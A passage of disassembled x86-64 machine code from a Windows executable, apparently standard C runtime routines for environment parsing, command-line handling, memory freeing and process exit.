   1400064c6:	48 89 15 1b 8a 01 00 	mov    %rdx,0x18a1b(%rip)        # 0x14001eee8
   1400064cd:	e8 3e 1b 00 00       	call   0x140008010
   1400064d2:	48 8b cb             	mov    %rbx,%rcx
   1400064d5:	48 89 7d 38          	mov    %rdi,0x38(%rbp)
   1400064d9:	e8 32 1b 00 00       	call   0x140008010
   1400064de:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   1400064e3:	8b c7                	mov    %edi,%eax
   1400064e5:	48 83 c4 30          	add    $0x30,%rsp
   1400064e9:	41 5f                	pop    %r15
   1400064eb:	41 5e                	pop    %r14
   1400064ed:	5f                   	pop    %rdi
   1400064ee:	5e                   	pop    %rsi
   1400064ef:	5d                   	pop    %rbp
   1400064f0:	c3                   	ret
   1400064f1:	cc                   	int3
   1400064f2:	cc                   	int3
   1400064f3:	cc                   	int3
   1400064f4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400064f9:	57                   	push   %rdi
   1400064fa:	48 83 ec 20          	sub    $0x20,%rsp
   1400064fe:	33 ff                	xor    %edi,%edi
   140006500:	48 39 3d 31 89 01 00 	cmp    %rdi,0x18931(%rip)        # 0x14001ee38
   140006507:	74 04                	je     0x14000650d
   140006509:	33 c0                	xor    %eax,%eax
   14000650b:	eb 4f                	jmp    0x14000655c
   14000650d:	e8 c2 30 00 00       	call   0x1400095d4
   140006512:	e8 21 36 00 00       	call   0x140009b38
   140006517:	48 8b d8             	mov    %rax,%rbx
   14000651a:	48 85 c0             	test   %rax,%rax
   14000651d:	75 0c                	jne    0x14000652b
   14000651f:	33 c9                	xor    %ecx,%ecx
   140006521:	e8 ea 1a 00 00       	call   0x140008010
   140006526:	83 c8 ff             	or     $0xffffffff,%eax
   140006529:	eb 31                	jmp    0x14000655c
   14000652b:	48 8b cb             	mov    %rbx,%rcx
   14000652e:	e8 35 00 00 00       	call   0x140006568
   140006533:	48 85 c0             	test   %rax,%rax
   140006536:	75 05                	jne    0x14000653d
   140006538:	83 cf ff             	or     $0xffffffff,%edi
   14000653b:	eb 0e                	jmp    0x14000654b
   14000653d:	48 89 05 0c 89 01 00 	mov    %rax,0x1890c(%rip)        # 0x14001ee50
   140006544:	48 89 05 ed 88 01 00 	mov    %rax,0x188ed(%rip)        # 0x14001ee38
   14000654b:	33 c9                	xor    %ecx,%ecx
   14000654d:	e8 be 1a 00 00       	call   0x140008010
   140006552:	48 8b cb             	mov    %rbx,%rcx
   140006555:	e8 b6 1a 00 00       	call   0x140008010
   14000655a:	8b c7                	mov    %edi,%eax
   14000655c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006561:	48 83 c4 20          	add    $0x20,%rsp
   140006565:	5f                   	pop    %rdi
   140006566:	c3                   	ret
   140006567:	cc                   	int3
   140006568:	48 8b c4             	mov    %rsp,%rax
   14000656b:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000656f:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140006573:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140006577:	48 89 78 20          	mov    %rdi,0x20(%rax)
   14000657b:	41 56                	push   %r14
   14000657d:	48 83 ec 30          	sub    $0x30,%rsp
   140006581:	48 8b f1             	mov    %rcx,%rsi
   140006584:	33 c9                	xor    %ecx,%ecx
   140006586:	4c 8b c6             	mov    %rsi,%r8
   140006589:	8a 16                	mov    (%rsi),%dl
   14000658b:	eb 25                	jmp    0x1400065b2
   14000658d:	80 fa 3d             	cmp    $0x3d,%dl
   140006590:	48 8d 41 01          	lea    0x1(%rcx),%rax
   140006594:	48 0f 44 c1          	cmove  %rcx,%rax
   140006598:	48 8b c8             	mov    %rax,%rcx
   14000659b:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000659f:	48 ff c0             	inc    %rax
   1400065a2:	41 80 3c 00 00       	cmpb   $0x0,(%r8,%rax,1)
   1400065a7:	75 f6                	jne    0x14000659f
   1400065a9:	49 ff c0             	inc    %r8
   1400065ac:	4c 03 c0             	add    %rax,%r8
   1400065af:	41 8a 10             	mov    (%r8),%dl
   1400065b2:	84 d2                	test   %dl,%dl
   1400065b4:	75 d7                	jne    0x14000658d
   1400065b6:	48 ff c1             	inc    %rcx
   1400065b9:	ba 08 00 00 00       	mov    $0x8,%edx
   1400065be:	e8 cd 19 00 00       	call   0x140007f90
   1400065c3:	48 8b d8             	mov    %rax,%rbx
   1400065c6:	48 85 c0             	test   %rax,%rax
   1400065c9:	75 0b                	jne    0x1400065d6
   1400065cb:	33 c9                	xor    %ecx,%ecx
   1400065cd:	e8 3e 1a 00 00       	call   0x140008010
   1400065d2:	33 c0                	xor    %eax,%eax
   1400065d4:	eb 61                	jmp    0x140006637
   1400065d6:	4c 8b f3             	mov    %rbx,%r14
   1400065d9:	eb 4c                	jmp    0x140006627
   1400065db:	48 83 cd ff          	or     $0xffffffffffffffff,%rbp
   1400065df:	48 ff c5             	inc    %rbp
   1400065e2:	80 3c 2e 00          	cmpb   $0x0,(%rsi,%rbp,1)
   1400065e6:	75 f7                	jne    0x1400065df
   1400065e8:	48 ff c5             	inc    %rbp
   1400065eb:	3c 3d                	cmp    $0x3d,%al
   1400065ed:	74 35                	je     0x140006624
   1400065ef:	ba 01 00 00 00       	mov    $0x1,%edx
   1400065f4:	48 8b cd             	mov    %rbp,%rcx
   1400065f7:	e8 94 19 00 00       	call   0x140007f90
   1400065fc:	48 8b f8             	mov    %rax,%rdi
   1400065ff:	48 85 c0             	test   %rax,%rax
   140006602:	74 4e                	je     0x140006652
   140006604:	4c 8b c6             	mov    %rsi,%r8
   140006607:	48 8b d5             	mov    %rbp,%rdx
   14000660a:	48 8b c8             	mov    %rax,%rcx
   14000660d:	e8 5e 0c 00 00       	call   0x140007270
   140006612:	33 c9                	xor    %ecx,%ecx
   140006614:	85 c0                	test   %eax,%eax
   140006616:	75 4e                	jne    0x140006666
   140006618:	49 89 3e             	mov    %rdi,(%r14)
   14000661b:	49 83 c6 08          	add    $0x8,%r14
   14000661f:	e8 ec 19 00 00       	call   0x140008010
   140006624:	48 03 f5             	add    %rbp,%rsi
   140006627:	8a 06                	mov    (%rsi),%al
   140006629:	84 c0                	test   %al,%al
   14000662b:	75 ae                	jne    0x1400065db
   14000662d:	33 c9                	xor    %ecx,%ecx
   14000662f:	e8 dc 19 00 00       	call   0x140008010
   140006634:	48 8b c3             	mov    %rbx,%rax
   140006637:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000663c:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   140006641:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140006646:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   14000664b:	48 83 c4 30          	add    $0x30,%rsp
   14000664f:	41 5e                	pop    %r14
   140006651:	c3                   	ret
   140006652:	48 8b cb             	mov    %rbx,%rcx
   140006655:	e8 22 00 00 00       	call   0x14000667c
   14000665a:	33 c9                	xor    %ecx,%ecx
   14000665c:	e8 af 19 00 00       	call   0x140008010
   140006661:	e9 65 ff ff ff       	jmp    0x1400065cb
   140006666:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000666c:	45 33 c9             	xor    %r9d,%r9d
   14000666f:	45 33 c0             	xor    %r8d,%r8d
   140006672:	33 d2                	xor    %edx,%edx
   140006674:	e8 6b 17 00 00       	call   0x140007de4
   140006679:	cc                   	int3
   14000667a:	cc                   	int3
   14000667b:	cc                   	int3
   14000667c:	48 85 c9             	test   %rcx,%rcx
   14000667f:	74 3b                	je     0x1400066bc
   140006681:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006686:	57                   	push   %rdi
   140006687:	48 83 ec 20          	sub    $0x20,%rsp
   14000668b:	48 8b 01             	mov    (%rcx),%rax
   14000668e:	48 8b d9             	mov    %rcx,%rbx
   140006691:	48 8b f9             	mov    %rcx,%rdi
   140006694:	eb 0f                	jmp    0x1400066a5
   140006696:	48 8b c8             	mov    %rax,%rcx
   140006699:	e8 72 19 00 00       	call   0x140008010
   14000669e:	48 8d 7f 08          	lea    0x8(%rdi),%rdi
   1400066a2:	48 8b 07             	mov    (%rdi),%rax
   1400066a5:	48 85 c0             	test   %rax,%rax
   1400066a8:	75 ec                	jne    0x140006696
   1400066aa:	48 8b cb             	mov    %rbx,%rcx
   1400066ad:	e8 5e 19 00 00       	call   0x140008010
   1400066b2:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400066b7:	48 83 c4 20          	add    $0x20,%rsp
   1400066bb:	5f                   	pop    %rdi
   1400066bc:	c3                   	ret
   1400066bd:	cc                   	int3
   1400066be:	cc                   	int3
   1400066bf:	cc                   	int3
   1400066c0:	48 83 ec 28          	sub    $0x28,%rsp
   1400066c4:	48 8b 09             	mov    (%rcx),%rcx
   1400066c7:	48 3b 0d 82 87 01 00 	cmp    0x18782(%rip),%rcx        # 0x14001ee50
   1400066ce:	74 05                	je     0x1400066d5
   1400066d0:	e8 a7 ff ff ff       	call   0x14000667c
   1400066d5:	48 83 c4 28          	add    $0x28,%rsp
   1400066d9:	c3                   	ret
   1400066da:	cc                   	int3
   1400066db:	cc                   	int3
   1400066dc:	48 83 ec 28          	sub    $0x28,%rsp
   1400066e0:	48 8b 09             	mov    (%rcx),%rcx
   1400066e3:	48 3b 0d 5e 87 01 00 	cmp    0x1875e(%rip),%rcx        # 0x14001ee48
   1400066ea:	74 05                	je     0x1400066f1
   1400066ec:	e8 8b ff ff ff       	call   0x14000667c
   1400066f1:	48 83 c4 28          	add    $0x28,%rsp
   1400066f5:	c3                   	ret
   1400066f6:	cc                   	int3
   1400066f7:	cc                   	int3
   1400066f8:	48 83 ec 38          	sub    $0x38,%rsp
   1400066fc:	48 c7 44 24 20 fe ff 	movq   $0xfffffffffffffffe,0x20(%rsp)
   140006703:	ff ff 
   140006705:	48 8d 0d 2c 87 01 00 	lea    0x1872c(%rip),%rcx        # 0x14001ee38
   14000670c:	e8 af ff ff ff       	call   0x1400066c0
   140006711:	90                   	nop
   140006712:	48 8d 0d 27 87 01 00 	lea    0x18727(%rip),%rcx        # 0x14001ee40
   140006719:	e8 be ff ff ff       	call   0x1400066dc
   14000671e:	90                   	nop
   14000671f:	48 8b 0d 2a 87 01 00 	mov    0x1872a(%rip),%rcx        # 0x14001ee50
   140006726:	e8 51 ff ff ff       	call   0x14000667c
   14000672b:	48 8b 0d 16 87 01 00 	mov    0x18716(%rip),%rcx        # 0x14001ee48
   140006732:	48 83 c4 38          	add    $0x38,%rsp
   140006736:	e9 41 ff ff ff       	jmp    0x14000667c
   14000673b:	cc                   	int3
   14000673c:	e9 b3 fd ff ff       	jmp    0x1400064f4
   140006741:	cc                   	int3
   140006742:	cc                   	int3
   140006743:	cc                   	int3
   140006744:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006749:	57                   	push   %rdi
   14000674a:	48 83 ec 20          	sub    $0x20,%rsp
   14000674e:	e8 81 2e 00 00       	call   0x1400095d4
   140006753:	48 8b 05 9e 87 01 00 	mov    0x1879e(%rip),%rax        # 0x14001eef8
   14000675a:	48 8d 1d f7 86 01 00 	lea    0x186f7(%rip),%rbx        # 0x14001ee58
   140006761:	48 85 c0             	test   %rax,%rax
   140006764:	48 0f 45 d8          	cmovne %rax,%rbx
   140006768:	40 32 ff             	xor    %dil,%dil
   14000676b:	0f b6 03             	movzbl (%rbx),%eax
   14000676e:	3c 20                	cmp    $0x20,%al
   140006770:	77 09                	ja     0x14000677b
   140006772:	84 c0                	test   %al,%al
   140006774:	74 34                	je     0x1400067aa
   140006776:	40 84 ff             	test   %dil,%dil
   140006779:	74 22                	je     0x14000679d
   14000677b:	3c 22                	cmp    $0x22,%al
   14000677d:	75 07                	jne    0x140006786
   14000677f:	40 84 ff             	test   %dil,%dil
   140006782:	40 0f 94 c7          	sete   %dil
   140006786:	8b c8                	mov    %eax,%ecx
   140006788:	e8 ff 31 00 00       	call   0x14000998c
   14000678d:	48 8d 4b 01          	lea    0x1(%rbx),%rcx
   140006791:	85 c0                	test   %eax,%eax
   140006793:	48 0f 44 cb          	cmove  %rbx,%rcx
   140006797:	48 8d 59 01          	lea    0x1(%rcx),%rbx
   14000679b:	eb ce                	jmp    0x14000676b
   14000679d:	3c 20                	cmp    $0x20,%al
   14000679f:	77 09                	ja     0x1400067aa
   1400067a1:	48 ff c3             	inc    %rbx
   1400067a4:	8a 03                	mov    (%rbx),%al
   1400067a6:	84 c0                	test   %al,%al
   1400067a8:	75 f3                	jne    0x14000679d
   1400067aa:	48 8b c3             	mov    %rbx,%rax
   1400067ad:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400067b2:	48 83 c4 20          	add    $0x20,%rsp
   1400067b6:	5f                   	pop    %rdi
   1400067b7:	c3                   	ret
   1400067b8:	48 3b ca             	cmp    %rdx,%rcx
   1400067bb:	74 30                	je     0x1400067ed
   1400067bd:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400067c2:	57                   	push   %rdi
   1400067c3:	48 83 ec 20          	sub    $0x20,%rsp
   1400067c7:	48 8b fa             	mov    %rdx,%rdi
   1400067ca:	48 8b d9             	mov    %rcx,%rbx
   1400067cd:	48 8b 03             	mov    (%rbx),%rax
   1400067d0:	48 85 c0             	test   %rax,%rax
   1400067d3:	74 05                	je     0x1400067da
   1400067d5:	e8 36 82 00 00       	call   0x14000ea10
   1400067da:	48 83 c3 08          	add    $0x8,%rbx
   1400067de:	48 3b df             	cmp    %rdi,%rbx
   1400067e1:	75 ea                	jne    0x1400067cd
   1400067e3:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400067e8:	48 83 c4 20          	add    $0x20,%rsp
   1400067ec:	5f                   	pop    %rdi
   1400067ed:	c3                   	ret
   1400067ee:	cc                   	int3
   1400067ef:	cc                   	int3
   1400067f0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400067f5:	57                   	push   %rdi
   1400067f6:	48 83 ec 20          	sub    $0x20,%rsp
   1400067fa:	48 8b fa             	mov    %rdx,%rdi
   1400067fd:	48 8b d9             	mov    %rcx,%rbx
   140006800:	48 3b ca             	cmp    %rdx,%rcx
   140006803:	74 1a                	je     0x14000681f
   140006805:	48 8b 03             	mov    (%rbx),%rax
   140006808:	48 85 c0             	test   %rax,%rax
   14000680b:	74 09                	je     0x140006816
   14000680d:	e8 fe 81 00 00       	call   0x14000ea10
   140006812:	85 c0                	test   %eax,%eax
   140006814:	75 0b                	jne    0x140006821
   140006816:	48 83 c3 08          	add    $0x8,%rbx
   14000681a:	48 3b df             	cmp    %rdi,%rbx
   14000681d:	75 e6                	jne    0x140006805
   14000681f:	33 c0                	xor    %eax,%eax
   140006821:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006826:	48 83 c4 20          	add    $0x20,%rsp
   14000682a:	5f                   	pop    %rdi
   14000682b:	c3                   	ret
   14000682c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006831:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140006836:	57                   	push   %rdi
   140006837:	48 83 ec 20          	sub    $0x20,%rsp
   14000683b:	49 8b d9             	mov    %r9,%rbx
   14000683e:	49 8b f8             	mov    %r8,%rdi
   140006841:	8b 0a                	mov    (%rdx),%ecx
   140006843:	e8 48 34 00 00       	call   0x140009c90
   140006848:	90                   	nop
   140006849:	48 8b cf             	mov    %rdi,%rcx
   14000684c:	e8 13 00 00 00       	call   0x140006864
   140006851:	90                   	nop
   140006852:	8b 0b                	mov    (%rbx),%ecx
   140006854:	e8 8b 34 00 00       	call   0x140009ce4
   140006859:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000685e:	48 83 c4 20          	add    $0x20,%rsp
   140006862:	5f                   	pop    %rdi
   140006863:	c3                   	ret
   140006864:	40 53                	rex push %rbx
   140006866:	48 83 ec 30          	sub    $0x30,%rsp
   14000686a:	48 8b d9             	mov    %rcx,%rbx
   14000686d:	80 3d f4 85 01 00 00 	cmpb   $0x0,0x185f4(%rip)        # 0x14001ee68
   140006874:	0f 85 9e 00 00 00    	jne    0x140006918
   14000687a:	b8 01 00 00 00       	mov    $0x1,%eax
   14000687f:	87 05 d7 85 01 00    	xchg   %eax,0x185d7(%rip)        # 0x14001ee5c
   140006885:	48 8b 01             	mov    (%rcx),%rax
   140006888:	8b 08                	mov    (%rax),%ecx
   14000688a:	85 c9                	test   %ecx,%ecx
   14000688c:	75 33                	jne    0x1400068c1
   14000688e:	48 8b 05 6b 77 01 00 	mov    0x1776b(%rip),%rax        # 0x14001e000
   140006895:	48 8b 15 c4 85 01 00 	mov    0x185c4(%rip),%rdx        # 0x14001ee60
   14000689c:	48 3b d0             	cmp    %rax,%rdx
   14000689f:	74 17                	je     0x1400068b8
   1400068a1:	8b c8                	mov    %eax,%ecx
   1400068a3:	83 e1 3f             	and    $0x3f,%ecx
   1400068a6:	48 33 c2             	xor    %rdx,%rax
   1400068a9:	48 d3 c8             	ror    %cl,%rax
   1400068ac:	45 33 c0             	xor    %r8d,%r8d
   1400068af:	33 d2                	xor    %edx,%edx
   1400068b1:	33 c9                	xor    %ecx,%ecx
   1400068b3:	e8 58 81 00 00       	call   0x14000ea10
   1400068b8:	48 8d 0d b9 85 01 00 	lea    0x185b9(%rip),%rcx        # 0x14001ee78
   1400068bf:	eb 0c                	jmp    0x1400068cd
   1400068c1:	83 f9 01             	cmp    $0x1,%ecx
   1400068c4:	75 0d                	jne    0x1400068d3
   1400068c6:	48 8d 0d c3 85 01 00 	lea    0x185c3(%rip),%rcx        # 0x14001ee90
   1400068cd:	e8 32 07 00 00       	call   0x140007004
   1400068d2:	90                   	nop
   1400068d3:	48 8b 03             	mov    (%rbx),%rax
   1400068d6:	83 38 00             	cmpl   $0x0,(%rax)
   1400068d9:	75 13                	jne    0x1400068ee
   1400068db:	48 8d 15 4e 9a 00 00 	lea    0x9a4e(%rip),%rdx        # 0x140010330
   1400068e2:	48 8d 0d 27 9a 00 00 	lea    0x9a27(%rip),%rcx        # 0x140010310
   1400068e9:	e8 ca fe ff ff       	call   0x1400067b8
   1400068ee:	48 8d 15 4b 9a 00 00 	lea    0x9a4b(%rip),%rdx        # 0x140010340
   1400068f5:	48 8d 0d 3c 9a 00 00 	lea    0x9a3c(%rip),%rcx        # 0x140010338
   1400068fc:	e8 b7 fe ff ff       	call   0x1400067b8
   140006901:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140006905:	83 38 00             	cmpl   $0x0,(%rax)
   140006908:	75 0e                	jne    0x140006918
   14000690a:	c6 05 57 85 01 00 01 	movb   $0x1,0x18557(%rip)        # 0x14001ee68
   140006911:	48 8b 43 10          	mov    0x10(%rbx),%rax
   140006915:	c6 00 01             	movb   $0x1,(%rax)
   140006918:	48 83 c4 30          	add    $0x30,%rsp
   14000691c:	5b                   	pop    %rbx
   14000691d:	c3                   	ret
   14000691e:	e8 0d 09 00 00       	call   0x140007230
   140006923:	90                   	nop
   140006924:	44 89 44 24 18       	mov    %r8d,0x18(%rsp)
   140006929:	89 54 24 10          	mov    %edx,0x10(%rsp)
   14000692d:	55                   	push   %rbp
   14000692e:	48 8b ec             	mov    %rsp,%rbp
   140006931:	48 83 ec 50          	sub    $0x50,%rsp
   140006935:	48 c7 45 e0 fe ff ff 	movq   $0xfffffffffffffffe,-0x20(%rbp)
   14000693c:	ff 
   14000693d:	48 89 5c 24 60       	mov    %rbx,0x60(%rsp)
   140006942:	8b d9                	mov    %ecx,%ebx
   140006944:	45 85 c0             	test   %r8d,%r8d
   140006947:	75 4a                	jne    0x140006993
   140006949:	33 c9                	xor    %ecx,%ecx
   14000694b:	ff 15 37 97 00 00    	call   *0x9737(%rip)        # 0x140010088
   140006951:	48 85 c0             	test   %rax,%rax
   140006954:	74 3d                	je     0x140006993
   140006956:	b9 4d 5a 00 00       	mov    $0x5a4d,%ecx
   14000695b:	66 39 08             	cmp    %cx,(%rax)
   14000695e:	75 33                	jne    0x140006993
   140006960:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
   140006964:	48 03 c8             	add    %rax,%rcx
   140006967:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   14000696d:	75 24                	jne    0x140006993
   14000696f:	b8 0b 02 00 00       	mov    $0x20b,%eax
   140006974:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   140006978:	75 19                	jne    0x140006993
   14000697a:	83 b9 84 00 00 00 0e 	cmpl   $0xe,0x84(%rcx)
   140006981:	76 10                	jbe    0x140006993
   140006983:	83 b9 f8 00 00 00 00 	cmpl   $0x0,0xf8(%rcx)
   14000698a:	74 07                	je     0x140006993
   14000698c:	8b cb                	mov    %ebx,%ecx
   14000698e:	e8 a5 00 00 00       	call   0x140006a38
   140006993:	c6 45 28 00          	movb   $0x0,0x28(%rbp)
   140006997:	48 8d 45 18          	lea    0x18(%rbp),%rax
   14000699b:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   14000699f:	48 8d 45 20          	lea    0x20(%rbp),%rax
   1400069a3:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   1400069a7:	48 8d 45 28          	lea    0x28(%rbp),%rax
   1400069ab:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   1400069af:	b8 02 00 00 00       	mov    $0x2,%eax
   1400069b4:	89 45 d4             	mov    %eax,-0x2c(%rbp)
   1400069b7:	89 45 d8             	mov    %eax,-0x28(%rbp)
   1400069ba:	4c 8d 4d d4          	lea    -0x2c(%rbp),%r9
   1400069be:	4c 8d 45 e8          	lea    -0x18(%rbp),%r8
   1400069c2:	48 8d 55 d8          	lea    -0x28(%rbp),%rdx
   1400069c6:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   1400069ca:	e8 5d fe ff ff       	call   0x14000682c
   1400069cf:	90                   	nop
   1400069d0:	83 7d 20 00          	cmpl   $0x0,0x20(%rbp)
   1400069d4:	75 1e                	jne    0x1400069f4
   1400069d6:	e8 59 33 00 00       	call   0x140009d34
   1400069db:	83 f8 01             	cmp    $0x1,%eax
   1400069de:	75 04                	jne    0x1400069e4
   1400069e0:	32 d2                	xor    %dl,%dl
   1400069e2:	eb 0a                	jmp    0x1400069ee
   1400069e4:	e8 17 33 00 00       	call   0x140009d00
   1400069e9:	84 c0                	test   %al,%al
   1400069eb:	0f 94 c2             	sete   %dl
   1400069ee:	83 7d 20 00          	cmpl   $0x0,0x20(%rbp)
   1400069f2:	74 0b                	je     0x1400069ff
   1400069f4:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   1400069f9:	48 83 c4 50          	add    $0x50,%rsp
   1400069fd:	5d                   	pop    %rbp
   1400069fe:	c3                   	ret
   1400069ff:	8b cb                	mov    %ebx,%ecx
   140006a01:	e8 02 00 00 00       	call   0x140006a08
   140006a06:	cc                   	int3
   140006a07:	cc                   	int3
   140006a08:	40 53                	rex push %rbx
   140006a0a:	48 83 ec 20          	sub    $0x20,%rsp
   140006a0e:	8b d9                	mov    %ecx,%ebx
   140006a10:	84 d2                	test   %dl,%dl
   140006a12:	74 11                	je     0x140006a25
   140006a14:	ff 15 06 97 00 00    	call   *0x9706(%rip)        # 0x140010120
   140006a1a:	48 8b c8             	mov    %rax,%rcx
   140006a1d:	8b d3                	mov    %ebx,%edx
   140006a1f:	ff 15 0b 97 00 00    	call   *0x970b(%rip)        # 0x140010130
   140006a25:	8b cb                	mov    %ebx,%ecx
   140006a27:	e8 0c 00 00 00       	call   0x140006a38
   140006a2c:	8b cb                	mov    %ebx,%ecx
   140006a2e:	ff 15 f4 96 00 00    	call   *0x96f4(%rip)        # 0x140010128
   140006a34:	cc                   	int3
   140006a35:	cc                   	int3
   140006a36:	cc                   	int3
   140006a37:	cc                   	int3
   140006a38:	40 53                	rex push %rbx
   140006a3a:	48 83 ec 30          	sub    $0x30,%rsp
   140006a3e:	48 c7 44 24 20 fe ff 	movq   $0xfffffffffffffffe,0x20(%rsp)
   140006a45:	ff ff 
   140006a47:	8b d9                	mov    %ecx,%ebx
   140006a49:	48 83 64 24 48 00    	andq   $0x0,0x48(%rsp)
   140006a4f:	4c 8d 44 24 48       	lea    0x48(%rsp),%r8
   140006a54:	48 8d 15 d5 b3 00 00 	lea    0xb3d5(%rip),%rdx        # 0x140011e30
   140006a5b:	33 c9                	xor    %ecx,%ecx
   140006a5d:	ff 15 dd 96 00 00    	call   *0x96dd(%rip)        # 0x140010140
   140006a63:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140006a68:	85 c0                	test   %eax,%eax
   140006a6a:	74 1e                	je     0x140006a8a
   140006a6c:	48 8d 15 d5 b3 00 00 	lea    0xb3d5(%rip),%rdx        # 0x140011e48
   140006a73:	ff 15 87 95 00 00    	call   *0x9587(%rip)        # 0x140010000
   140006a79:	48 85 c0             	test   %rax,%rax
   140006a7c:	74 07                	je     0x140006a85
   140006a7e:	8b cb                	mov    %ebx,%ecx
   140006a80:	e8 8b 7f 00 00       	call   0x14000ea10
   140006a85:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140006a8a:	48 85 c9             	test   %rcx,%rcx
   140006a8d:	74 07                	je     0x140006a96
   140006a8f:	ff 15 a3 96 00 00    	call   *0x96a3(%rip)        # 0x140010138
   140006a95:	90                   	nop
   140006a96:	48 83 c4 30          	add    $0x30,%rsp
   140006a9a:	5b                   	pop    %rbx
   140006a9b:	c3                   	ret
   140006a9c:	48 89 0d bd 83 01 00 	mov    %rcx,0x183bd(%rip)        # 0x14001ee60
   140006aa3:	c3                   	ret
   140006aa4:	ba 02 00 00 00       	mov    $0x2,%edx
   140006aa9:	33 c9                	xor    %ecx,%ecx
   140006aab:	44 8d 42 ff          	lea    -0x1(%rdx),%r8d
   140006aaf:	e9 70 fe ff ff       	jmp    0x140006924
   140006ab4:	33 d2                	xor    %edx,%edx
   140006ab6:	33 c9                	xor    %ecx,%ecx
   140006ab8:	44 8d 42 01          	lea    0x1(%rdx),%r8d
   140006abc:	e9 63 fe ff ff       	jmp    0x140006924
   140006ac1:	cc                   	int3
   140006ac2:	cc                   	int3
   140006ac3:	cc                   	int3
   140006ac4:	45 33 c0             	xor    %r8d,%r8d
   140006ac7:	41 8d 50 02          	lea    0x2(%r8),%edx
   140006acb:	e9 54 fe ff ff       	jmp    0x140006924
   140006ad0:	48 83 ec 28          	sub    $0x28,%rsp
   140006ad4:	4c 8b 05 25 75 01 00 	mov    0x17525(%rip),%r8        # 0x14001e000
   140006adb:	48 8b d1             	mov    %rcx,%rdx
   140006ade:	4c 39 05 7b 83 01 00 	cmp    %r8,0x1837b(%rip)        # 0x14001ee60
   140006ae5:	75 1f                	jne    0x140006b06
   140006ae7:	41 8b c0             	mov    %r8d,%eax
   140006aea:	b9 40 00 00 00       	mov    $0x40,%ecx
   140006aef:	83 e0 3f             	and    $0x3f,%eax
   140006af2:	2b c8                	sub    %eax,%ecx
   140006af4:	48 d3 ca             	ror    %cl,%rdx
   140006af7:	49 33 d0             	xor    %r8,%rdx
   140006afa:	48 89 15 5f 83 01 00 	mov    %rdx,0x1835f(%rip)        # 0x14001ee60
   140006b01:	48 83 c4 28          	add    $0x28,%rsp
   140006b05:	c3                   	ret
   140006b06:	e8 25 07 00 00       	call   0x140007230
   140006b0b:	cc                   	int3
   140006b0c:	45 33 c0             	xor    %r8d,%r8d
   140006b0f:	33 d2                	xor    %edx,%edx
   140006b11:	e9 0e fe ff ff       	jmp    0x140006924
   140006b16:	cc                   	int3
   140006b17:	cc                   	int3
   140006b18:	48 83 ec 28          	sub    $0x28,%rsp
   140006b1c:	8d 81 00 c0 ff ff    	lea    -0x4000(%rcx),%eax
   140006b22:	a9 ff 3f ff ff       	test   $0xffff3fff,%eax
   140006b27:	75 12                	jne    0x140006b3b
   140006b29:	81 f9 00 c0 00 00    	cmp    $0xc000,%ecx
   140006b2f:	74 0a                	je     0x140006b3b
   140006b31:	87 0d 35 86 01 00    	xchg   %ecx,0x18635(%rip)        # 0x14001f16c
   140006b37:	33 c0                	xor    %eax,%eax
   140006b39:	eb 15                	jmp    0x140006b50
   140006b3b:	e8 2c 14 00 00       	call   0x140007f6c
   140006b40:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140006b46:	e8 79 12 00 00       	call   0x140007dc4
   140006b4b:	b8 16 00 00 00       	mov    $0x16,%eax
   140006b50:	48 83 c4 28          	add    $0x28,%rsp
   140006b54:	c3                   	ret
   140006b55:	cc                   	int3
   140006b56:	cc                   	int3
   140006b57:	cc                   	int3
   140006b58:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006b5d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140006b62:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140006b67:	57                   	push   %rdi
   140006b68:	48 83 ec 30          	sub    $0x30,%rsp
   140006b6c:	49 8b f9             	mov    %r9,%rdi
   140006b6f:	8b 0a                	mov    (%rdx),%ecx
   140006b71:	e8 1a 31 00 00       	call   0x140009c90
   140006b76:	90                   	nop
   140006b77:	48 8d 1d fa 89 01 00 	lea    0x189fa(%rip),%rbx        # 0x14001f578
   140006b7e:	48 8d 35 6b 7a 01 00 	lea    0x17a6b(%rip),%rsi        # 0x14001e5f0
   140006b85:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140006b8a:	48 8d 05 ef 89 01 00 	lea    0x189ef(%rip),%rax        # 0x14001f580
   140006b91:	48 3b d8             	cmp    %rax,%rbx
   140006b94:	74 19                	je     0x140006baf
   140006b96:	48 39 33             	cmp    %rsi,(%rbx)
   140006b99:	74 0e                	je     0x140006ba9
   140006b9b:	48 8b d6             	mov    %rsi,%rdx
   140006b9e:	48 8b cb             	mov    %rbx,%rcx
